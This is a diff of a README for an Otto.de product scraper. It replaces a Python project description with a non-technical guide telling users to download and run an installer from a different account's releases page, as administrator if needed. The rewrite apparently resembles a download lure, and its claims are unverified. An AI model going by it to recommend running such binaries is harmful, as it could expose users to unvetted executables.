@@ -1,205 +1,84 @@
-# Otto.de Product Scraper (Pay Per Result)
-> A production-ready scraper that collects detailed product data from Otto.de product and category pages. It helps businesses track pricing, availability, and product attributes at scale while delivering clean, structured data for analytics and AI workflows.
+# 🌟 otto-de-product-scraper-pay-per-result - Simple Tool to Scrape Product Data
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome! This README will help you download and run the Otto.de product data scraper. You do not need any programming knowledge. Just follow the steps below, and you can monitor product prices easily.
 
+[![Download Otto Scraper](https://img.shields.io/badge/Download%20Otto%20Scraper-Click%20Here-blue)](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/releases)
 
+## 💡 What is Otto.de Product Scraper?
 
+The Otto.de product scraper is a simple tool designed to collect and monitor product data from the Otto.de website. With this tool, you can track prices and product details, helping you make informed purchasing decisions. Whether you are a casual shopper or a price-conscious buyer, this scraper provides essential information at your fingertips.
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>otto-de-product-scraper-pay-per-result</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+## 🛠️ System Requirements
 
+Before you download the tool, ensure your system meets the following requirements:
 
-## Introduction
-This project extracts structured product information from Otto.de, one of Germany’s largest e-commerce platforms.
-It solves the challenge of reliably collecting up-to-date product data across thousands of listings.
-It is designed for data teams, analysts, and product intelligence platforms that require consistent, high-quality outputs.
+- **Operating System:** Windows 10 or later, MacOS, or Linux.
+- **Internet Connection:** A stable connection is essential for scraping product data.
+- **Storage Space:** At least 100 MB of free space on your hard drive.
 
-### E-commerce Product Intelligence on Otto.de
-- Supports both individual product URLs and full category listings
-- Handles pagination to ensure complete category coverage
-- Extracts rich attributes such as pricing, brand, ratings, and specifications
-- Produces normalized data suitable for analytics, monitoring, and AI training
-- Scales efficiently for large product catalogs
+## 📦 Download & Install
 
-## Features
-| Feature | Description |
-|----------|-------------|
-| Product Page Scraping | Extracts full product details from individual Otto.de product URLs. |
-| Category Page Support | Collects products from category pages with optional pagination. |
-| Rich Attribute Extraction | Captures brand, pricing, GTIN, ratings, variants, and specifications. |
-| Price Tracking Ready | Provides structured price and currency fields for monitoring changes. |
-| Structured Output | Delivers clean, consistent records suitable for databases and pipelines. |
+To get started, visit the releases page to download the tool. Click the link below:
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|-------------|------------------|
-| url | Original product page URL. |
-| name | Product title as listed on Otto.de. |
-| price | Current selling price. |
-| regular_price | Original or non-discounted price. |
-| currency | Price currency (e.g., EUR). |
-| sku | Product stock keeping unit identifier. |
-| gtin | Global Trade Item Number if available. |
-| brand | Product brand or manufacturer. |
-| breadcrumbs | Category hierarchy path. |
-| main_image | Primary product image URL. |
-| images | Additional product image URLs. |
-| description | Full product description text. |
-| attributes | Detailed specifications and properties. |
-| rating_value | Average customer rating score. |
-| review_count | Total number of reviews. |
-| scraped_at | Timestamp when the data was collected. |
+[Visit this page to download the latest release.](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/releases)
 
----
-## Example Output
+Once you are on the releases page, follow these steps:
 
-    [
-          {
-            "url": "https://www.otto.de/p/icepeak-funktionsjacke-d-funktionsjacke-adenau-1-st-wasserdicht-winddicht-C1653315698/",
-            "name": "Funktionsjacke D FUNKTIONSJACKE ADENAU",
-            "price": 60.79,
-            "regular_price": 63.99,
-            "currency": "EUR",
-            "sku": "2283122146",
-            "gtin": "6438581368792",
-            "brand": "ICEPEAK",
-            "breadcrumbs": [
-                  "Startseite",
-                  "Damen-Mode",
-                  "Bekleidung",
-                  "Jacken",
-                  "Übergangsjacken"
-            ],
-            "rating_value": 4.5,
-            "review_count": 15,
-            "scraped_at": "2025-07-21T12:10:38.908Z"
-          }
-    ]
+1. Click on the latest version of the tool.
+2. Download the installer file for your operating system.
+3. Locate the downloaded file in your downloads folder.
+4. Run the installer by double-clicking the file.
+5. Follow the installation prompts to complete the setup.
 
----
-## Directory Structure Tree
+After installation, you will see the application icon on your desktop or in your applications menu.
 
-    Otto.de Product Scraper (Pay Per Result)/
-    ├── src/
-    │   ├── runner.py
-    │   ├── collectors/
-    │   │   ├── product_page.py
-    │   │   └── category_page.py
-    │   ├── parsers/
-    │   │   ├── product_parser.py
-    │   │   └── attributes_parser.py
-    │   ├── utils/
-    │   │   ├── http_client.py
-    │   │   └── normalization.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── outputs.sample.json
-    ├── requirements.txt
-    └── README.md
+## 🔍 How to Use the Scraper
 
----
-## Use Cases
-- **E-commerce analysts** use it to monitor Otto.de prices, so they can detect discounts and market trends early.
-- **Retail intelligence teams** use it to compare competing products, so they can optimize pricing strategies.
-- **Data scientists** use it to build training datasets, so they can model demand and pricing behavior.
-- **Market researchers** use it to analyze category-level trends, so they can understand consumer preferences.
-- **Automation platforms** use it to feed dashboards, so stakeholders get real-time product insights.
+Using the Otto.de product scraper is easy. Here are the steps you need to follow:
 
----
-## FAQs
-**Does this scraper support both product and category URLs?**
-Yes, it works with individual product pages as well as category listings, allowing flexible data collection strategies.
+1. Open the application by double-clicking the icon.
+2. Enter the URL of the product page you want to monitor.
+3. Set up the parameters for data scraping. This includes selecting the product details you would like to track.
+4. Click on the “Start Scraping” button.
+5. View the results and save them in your desired format (CSV or JSON).
 
-**Can it handle large categories with many pages?**
-Pagination support ensures that multi-page categories are processed thoroughly without missing products.
+## 🌐 Features
 
-**What formats is the output suitable for?**
-The structured output is optimized for databases, analytics tools, spreadsheets, and machine learning pipelines.
+- **Easy-to-Use Interface:** The user-friendly interface ensures that anyone can use the tool without any programming skills.
+- **Data Monitoring:** Track multiple products with real-time updates on prices and availability.
+- **Export Options:** Save data as CSV or JSON for easy further analysis.
+- **Compatibility:** Works on Windows, MacOS, and Linux operating systems.
 
-**How reliable is the extracted pricing data?**
-Prices are captured directly from live product pages, providing high accuracy for monitoring and analysis.
+## 📋 Troubleshooting
 
----
-### Performance Benchmarks and Results
+If you encounter any issues during installation or use, consider the following tips:
 
-**Primary Metric:** Processes an average of 350–500 product pages per hour under standard conditions.
+- **Connection Issues:** Ensure your internet connection is stable. A weak connection may interrupt data scraping.
+- **Installation Errors:** If the installation fails, try running the installer as an administrator. Right-click the file and select “Run as administrator.”
+- **No Data Found:** Ensure you entered a valid product URL. The scraper cannot work with broken links.
 
-**Reliability Metric:** Maintains a successful extraction rate above 98% across diverse product categories.
+## 🌟 Community Support
 
-**Efficiency Metric:** Optimized requests and parsing keep memory usage stable even during large category runs.
+Need help? Join our community for support! You can raise issues or ask questions in the [Issues section](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/issues) of this repository. Other users and contributors are ready to help you troubleshoot.
 
-**Quality Metric:** Over 95% field completeness for core attributes such as price, brand, and identifiers.
+## 🔄 Updates
 
+Keep your application updated for the latest features and improvements. Regularly check the downloads page for new releases:
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+[Visit this page to download the latest release.](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/releases)
+
+## 🙋‍♂️ Contributions
+
+We welcome contributions from anyone interested in improving the tool. If you have ideas for features or fixes, please feel free to submit your suggestions. Visit the [Contributing guidelines](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/blob/main/CONTRIBUTING.md) for details.
+
+## 📜 License
+
+This project is open-source and available under the MIT License. For more information, check the [LICENSE file](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/blob/main/LICENSE).
+
+## 🏁 Conclusion
+
+With the Otto.de product scraper, you can easily gather data to make informed purchasing choices. Download the tool now and start monitoring product prices effortlessly!
+
+[![Download Otto Scraper](https://img.shields.io/badge/Download%20Otto%20Scraper-Click%20Here-blue)](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/releases)
